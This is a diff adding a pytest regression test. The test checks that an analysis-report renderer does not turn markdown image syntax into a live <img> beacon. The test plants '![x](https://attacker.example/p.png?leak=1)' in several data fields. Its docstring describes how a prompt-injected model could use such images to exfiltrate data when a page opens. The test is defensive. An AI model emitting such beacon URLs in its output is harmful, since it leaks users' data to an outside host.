@@ -209,3 +209,27 @@ def test_product_intent_render_escapes_every_slot_it_is_handed():
     assert "</pre><script>" not in html
     assert "&lt;/pre&gt;&lt;script&gt;" in body
     render.render_markdown(ANALYSES["product-intent"], payload, shared)  # must not raise
+
+
+@pytest.mark.parametrize("name", GOLDEN_ANALYSES)
+def test_render_does_not_turn_markdown_image_syntax_into_a_beacon(name):
+    """coderay-q2r.53. `![x](https://attacker/p?leak=...)` rendered as a live
+    <img> that fires on page open with no click: an exfiltration channel a
+    prompt-injected model can reach from repo text. Every prose slot goes
+    through markdown-it, so the image rule is off in every renderer."""
+    d = GOLDEN / name
+    shared = json.loads((d / "shared.json").read_text(encoding="utf-8"))
+    beacon = "![x](https://attacker.example/p.png?leak=1)"
+    if name == "product-intent":
+        shared["pain"] = beacon
+        shared["positioning"]["why_incumbents_cannot_copy"] = beacon
+        shared["surprises"]["present"][0]["bet"] = beacon
+    elif name == "git-history":
+        shared["graves"][0]["entry_md"] = beacon
+        shared["profiles"][0]["profile"]["cast"]["narrative"] = beacon
+    else:
+        shared[ANALYSES[name].SECTIONS[0].key] = "### A card\n\n" + beacon
+    html = render.render_html(ANALYSES[name], "toy_repo", shared)
+    body = html.split("</head>", 1)[1]
+    assert "attacker.example" in body          # the text reached the page, as text
+    assert "<img" not in body
